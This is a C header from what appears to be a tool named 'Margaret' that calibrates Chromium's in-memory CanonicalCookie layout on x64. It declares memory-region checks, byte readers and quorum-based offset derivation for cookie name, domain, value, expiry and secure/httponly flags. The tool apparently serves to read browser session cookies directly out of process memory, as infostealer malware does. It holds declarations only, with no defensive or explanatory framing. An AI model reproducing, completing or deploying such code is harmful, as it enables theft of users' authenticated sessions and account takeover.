/* Runtime CanonicalCookie layout-calibration contract. */
#ifndef MARGARET_CC_LAYOUT_H
#define MARGARET_CC_LAYOUT_H

#include "resolve.h"

/* Byte-read x64 MEMORY_BASIC_INFORMATION view. */

typedef struct MEMORY_BASIC_INFORMATION {
    ULONG_PTR BaseAddress;       /* +0x00 */
    ULONG_PTR AllocationBase;    /* +0x08 */
    DWORD AllocationProtect;     /* +0x10 */
    WORD PartitionId;            /* +0x14 */
    WORD Padding;                /* +0x16 */
    ULONG_PTR RegionSize;        /* +0x18 */
    DWORD State;                 /* +0x20 */
    DWORD Protect;               /* +0x24 */
    DWORD Type;                  /* +0x28 */
} MEMORY_BASIC_INFORMATION;

_Static_assert(sizeof(MEMORY_BASIC_INFORMATION) == 0x30,
               "MEMORY_BASIC_INFORMATION x64 size");
_Static_assert(offsetof(MEMORY_BASIC_INFORMATION, RegionSize) == 0x18,
               "MEMORY_BASIC_INFORMATION.RegionSize x64 offset");
_Static_assert(offsetof(MEMORY_BASIC_INFORMATION, State) == 0x20,
               "MEMORY_BASIC_INFORMATION.State x64 offset");
_Static_assert(offsetof(MEMORY_BASIC_INFORMATION, Protect) == 0x24,
               "MEMORY_BASIC_INFORMATION.Protect x64 offset");

typedef ULONG_PTR (MS_ABI *PVIRTUAL_QUERY_FN)(
    PCVOID address, MEMORY_BASIC_INFORMATION *info, SIZE_T length);

#define MBI_OFF_STATE   0x20u
#define MBI_OFF_PROTECT 0x24u
#define MBI_OFF_BASE    0x00u
#define MBI_OFF_REGION  0x18u

#define MEM_COMMIT 0x1000u
#define PAGE_GUARD 0x100u

/* Little-endian byte readers. */

CODE_SECTION DWORD CcReadU32(const BYTE *data);
CODE_SECTION ULONGLONG CcReadU64(const BYTE *data);

/* x64 libc++ string view. */

typedef struct CC_STRING_VIEW {
    const BYTE *Data;
    DWORD Length;
} CC_STRING_VIEW;

CODE_SECTION BOOL CcReadString(const BYTE *string,
                                CC_STRING_VIEW *view);

/* Pointer and region checks. */

CODE_SECTION BOOL CcPtrPlausible(ULONG_PTR p);
CODE_SECTION BOOL CcRegionOk(PCVOID p, MEMORY_BASIC_INFORMATION *mbi,
                              PVIRTUAL_QUERY_FN vq);

/* Calibrated CanonicalCookie offsets. */

#define CAL_SAMPLE_MAX    16u   /* Stash cap. */
#define CAL_SAMPLE_MIN    4u    /* Quorum floor. */

typedef struct CC_LAYOUT {
    DWORD OffName;
    DWORD OffDomain;
    DWORD OffPath;
    DWORD OffValue;
    DWORD OffFlag;
    DWORD OffCreation;
    DWORD OffExpiry;
    DWORD OffSameSite;
    DWORD OffPort;
    DWORD Calibrated;
} CC_LAYOUT;

/* Derive offsets by strict quorum; diag receives the failing step. */
CODE_SECTION BOOL MargaretCcCalibrate(
    const BYTE *const *sample, DWORD n, PVIRTUAL_QUERY_FN vq,
    CC_LAYOUT *lay, DWORD *diag);

/* secure_/httponly_ calibration. */

#define FLAGS_ALL_CAND 0xFFFFFFFFu

typedef struct FLAGS_CAL {
    DWORD Candidates;  /* bitmask of surviving candidates */
    DWORD WindowBase;  /* cookie-relative base of the window */
    BYTE  Calibrated;  /* 0 = in progress, 1 = done, 2 = failed */
    BYTE  SecureOff;   /* calibrated offset of secure_ */
} FLAGS_CAL;

CODE_SECTION void MargaretCcFlagsUpdate(
    FLAGS_CAL *cal, const BYTE *cookie, const BYTE *name,
    DWORD nameLen);
CODE_SECTION DWORD MargaretCcFlagsRead(
    const FLAGS_CAL *cal, const BYTE *cookie);

#endif /* MARGARET_CC_LAYOUT_H */
